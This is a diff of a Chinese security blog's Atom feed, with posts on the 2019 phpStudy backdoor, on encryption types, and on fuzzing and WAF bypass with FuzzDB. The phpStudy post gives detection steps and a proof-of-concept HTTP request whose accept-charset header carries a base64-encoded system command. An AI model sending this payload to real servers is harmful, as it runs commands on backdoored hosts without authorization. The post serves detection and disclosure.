@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lilifengcode.github.io/"/>
-  <updated>2019-10-31T14:24:26.827Z</updated>
+  <updated>2019-10-31T13:58:58.419Z</updated>
   <id>http://lilifengcode.github.io/</id>
   
   <author>
@@ -15,20 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>phpstudy</title>
-    <link href="http://lilifengcode.github.io/post/5a5421ee.html"/>
-    <id>http://lilifengcode.github.io/post/5a5421ee.html</id>
-    <published>2019-10-31T14:24:26.000Z</published>
-    <updated>2019-10-31T14:24:26.827Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>数字签名安全验证</title>
@@ -120,7 +106,7 @@
     <link href="http://lilifengcode.github.io/post/90ddb320.html"/>
     <id>http://lilifengcode.github.io/post/90ddb320.html</id>
     <published>2019-09-23T14:23:20.000Z</published>
-    <updated>2019-10-31T14:24:21.566Z</updated>
+    <updated>2019-10-31T14:24:35.269Z</updated>
     
     <content type="html"><![CDATA[<h1 id="phpstudy后门"><a href="#phpstudy后门" class="headerlink" title="phpstudy后门"></a>phpstudy后门</h1><p><img src="https://s2.ax1x.com/2019/09/24/uAxE2n.jpg" alt></p><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用</p><h2 id="0x02-问题版本"><a href="#0x02-问题版本" class="headerlink" title="0x02 问题版本"></a>0x02 问题版本</h2><p>phpStudy2016 ：php-5.2.17、php-5.4.45 </p><p>phpStudy2018 ：php-5.2.17、php-5.4.45</p><h2 id="0x03-排查方法"><a href="#0x03-排查方法" class="headerlink" title="0x03 排查方法"></a>0x03 排查方法</h2><p>1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个</p><p>2.用记事本打开，CTRL+F搜索eval，有<figure class="highlight plain"><figcaption><span>%s;@eval(%s('%s')); $V</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://s2.ax1x.com/2019/09/24/ukxPTe.png)</span><br><span class="line"></span><br><span class="line">## 0x04 后门复现</span><br><span class="line"></span><br><span class="line">poc: 【poc放出来源**圈子社区**】</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">GET /caijue.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Cookie: PHPSESSID=fg6b95loelkml2384i5lg7d4l3</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p><p>注意点：Accept-Encoding: gzip,deflate 两种编码方式之间没有空格</p><p>​               accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 执行的命令base64加密</p><p><img src="https://s2.ax1x.com/2019/09/24/uASsL6.md.png" alt></p><h2 id="0x05-修复方式"><a href="#0x05-修复方式" class="headerlink" title="0x05 修复方式"></a>0x05 修复方式</h2><p>等官网发布修复版本吧</p>]]></content>
     
@@ -247,7 +233,7 @@
     <link href="http://lilifengcode.github.io/post/932a020d.html"/>
     <id>http://lilifengcode.github.io/post/932a020d.html</id>
     <published>2019-04-17T15:50:36.000Z</published>
-    <updated>2019-10-31T14:20:46.214Z</updated>
+    <updated>2019-10-31T14:24:35.262Z</updated>
     
     <content type="html"><![CDATA[<h1 id="非对称加密和对称加密"><a href="#非对称加密和对称加密" class="headerlink" title="非对称加密和对称加密"></a>非对称加密和对称加密</h1><p><img src="https://s2.ax1x.com/2019/10/18/KZ3Rjx.png" alt></p><p>非对称加密和对称加密在加密和解密过程、加密解密速度、传输的安全性上都有所不同，具体介绍如下：</p><h2 id="1．加密和解密过程不同"><a href="#1．加密和解密过程不同" class="headerlink" title="1．加密和解密过程不同"></a>1．加密和解密过程不同</h2><p>对称加密过程和解密过程使用的同一个密钥，加密过程相当于用原文+密钥可以传输出密文，同时解密过程用密文-密钥可以推导出原文。但非对称加密采用了两个密钥，一般使用公钥进行加密，使用私钥进行解密。</p><p>非对称加密流程图：</p><p><a href="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/2f738bd4b31c870179fcaa8e297f9e2f0708ff14.jpg" target="_blank" rel="noopener"><img src="file:///C:%5CUsers%5Clilifeng%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image001.png" alt="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=fd5af9722634349b74536683f9da39f6/2f738bd4b31c870179fcaa8e297f9e2f0708ff14.jpg"></a></p><p>对称加密流程图：</p><p><a href="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e7cd7b899e510fb358a5c3f3d733c895d1430c11.jpg" target="_blank" rel="noopener"><img src="file:///C:%5CUsers%5Clilifeng%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image002.png" alt="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=5d50e38dfcd3572c66b794daba234f1f/e7cd7b899e510fb358a5c3f3d733c895d1430c11.jpg"></a></p><h2 id="2．加密解密速度不同"><a href="#2．加密解密速度不同" class="headerlink" title="2．加密解密速度不同"></a>2．加密解密速度不同</h2><p>对称加密解密的速度比较快，适合数据比较长时的使用。非对称加密和解密花费的时间长、速度相对较慢，只适合对少量数据的使用。</p><h2 id="3．传输的安全性不同"><a href="#3．传输的安全性不同" class="headerlink" title="3．传输的安全性不同"></a>3．传输的安全性不同</h2><p>对称加密的过程中无法确保密钥被安全传递，密文在传输过程中是可能被第三方截获的，如果密码本也被第三方截获，则传输的密码信息将被第三方破获，安全性相对较低。</p><p>非对称加密算法中私钥是基于不同的算法生成不同的随机数，私钥通过一定的加密算法推导出公钥，但私钥到公钥的推导过程是单向的，也就是说公钥无法反推导出私钥。所以安全性较高。</p><h2 id="4-常见加密方式"><a href="#4-常见加密方式" class="headerlink" title="4.  常见加密方式"></a>4.  常见加密方式</h2><p>在非对称加密中使用的主要算法有：RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）</p><p>在对称加密中使用的主要算法有：DES（Data Encryption Standard）、3DES（Triple DES）、AES（Advanced Encryption Standard）、Blowfish</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>百度</p>]]></content>
     
@@ -430,6 +416,27 @@
       
       
         &lt;h1 id=&quot;浅谈DNS&quot;&gt;&lt;a href=&quot;#浅谈DNS&quot; class=&quot;headerlink&quot; title=&quot;浅谈DNS&quot;&gt;&lt;/a&gt;浅谈DNS&lt;/h1&gt;&lt;h2 id=&quot;0X00-什么是DNS&quot;&gt;&lt;a href=&quot;#0X00-什么是DNS&quot; class=&quot;headerlink
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Fuzz-漏洞挖掘利器</title>
+    <link href="http://lilifengcode.github.io/post/cd677755.html"/>
+    <id>http://lilifengcode.github.io/post/cd677755.html</id>
+    <published>2019-04-15T11:41:49.000Z</published>
+    <updated>2019-06-28T08:25:01.143Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Fuzz-漏洞挖掘利器"><a href="#Fuzz-漏洞挖掘利器" class="headerlink" title="Fuzz-漏洞挖掘利器"></a>Fuzz-漏洞挖掘利器</h1><h2 id="0x00-什么模糊测试"><a href="#0x00-什么模糊测试" class="headerlink" title="0x00 什么模糊测试"></a>0x00 什么模糊测试</h2><p>模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。能够在一项产品投入市场使用之前对潜在的应当被堵塞的攻击渠道进行提示。</p><p>模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用。而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。模糊测试其数据具有不确定性，也没有明显的针对性，简单来说就是没有逻辑，没有常理。只要将准备好的那些杂乱的程序插入其中，然后等待bug的出现，而出现的漏洞是测试员们先前无法预知的。</p><h2 id="0x01-Web渗透中常规FUZZ相关的手段"><a href="#0x01-Web渗透中常规FUZZ相关的手段" class="headerlink" title="0x01 Web渗透中常规FUZZ相关的手段"></a>0x01 Web渗透中常规FUZZ相关的手段</h2><ul><li>目录扫描</li><li>口令枚举</li><li>爬虫</li><li>….</li></ul><h2 id="0x02-ByPass的原理"><a href="#0x02-ByPass的原理" class="headerlink" title="0x02 ByPass的原理"></a>0x02 ByPass的原理</h2><p>在这里我们构建一个概念模型：</p><p><img src="https://s2.ax1x.com/2019/04/15/AjwhvT.png" alt></p><p>Bypass就是寻找大于深绿区域的那块黑色内容</p><p><strong>没有绝对安全的系统，当然防护是一样</strong></p><p>通常情况下，我们的目的都是发送一些攻击且能够快速有效验证漏洞payload，但是这些常用的payload都被WAF加入了规则库中，如果遇到了规则库中存在的payload，WAF就要出来搞事情了，它会记录你的攻击数据，并且将到达Web服务器之前的数据给丢弃。如此一来，我们无法进行进一步的测试了   </p><h2 id="0x02-FuzzDB"><a href="#0x02-FuzzDB" class="headerlink" title="0x02 FuzzDB"></a>0x02 FuzzDB</h2><ul><li><strong>GIT:<a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb</a></strong></li><li><strong>playload下载：<a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></strong></li></ul><p>FuzzDB是为了通过动态应用程序安全性测试来增加引起和识别安全感兴趣条件的可能性。</p><p>这是第一个也是最全面的故障注入模式的开放字典，可预测的资源位置，以及匹配服务器响应的正则表达式。</p><p>该数据库收集了大量已知的攻击模式，如XSS，Xpath注入，SQL注入，XML攻击，本地文件包含，路径遍历，远程文件包含，ldap攻击，格式化字符串，http协议攻击等</p><p><img src="https://s2.ax1x.com/2019/04/15/AjB1TH.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/15/AjBl0e.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/15/AjB1TH.png" alt></p><h2 id="0x03-FUZZDB项目"><a href="#0x03-FUZZDB项目" class="headerlink" title="0x03 FUZZDB项目"></a>0x03 FUZZDB项目</h2><ul><li>OWASP Zap Proxy fuzzdb plugin <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></li><li>SecLists <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists</a></li><li>TrustedSec Pentesters Framework <a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">https://github.com/trustedsec/ptf</a></li><li>Rapid7 Metasploit <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></li><li>Portswigger Burp Suite <a href="http://portswigger.net" target="_blank" rel="noopener">http://portswigger.net</a></li><li>Protofuzz <a href="https://github.com/trailofbits/protofuzz" target="_blank" rel="noopener">https://github.com/trailofbits/protofuzz</a></li><li>BlackArch Linux <a href="https://www.blackarch.org/" target="_blank" rel="noopener">https://www.blackarch.org/</a></li><li>ArchStrike Linux <a href="https://archstrike.org/" target="_blank" rel="noopener">https://archstrike.org/</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Fuzz-漏洞挖掘利器&quot;&gt;&lt;a href=&quot;#Fuzz-漏洞挖掘利器&quot; class=&quot;headerlink&quot; title=&quot;Fuzz-漏洞挖掘利器&quot;&gt;&lt;/a&gt;Fuzz-漏洞挖掘利器&lt;/h1&gt;&lt;h2 id=&quot;0x00-什么模糊测试&quot;&gt;&lt;a href=&quot;#0x00-什
       
     
     </summary>
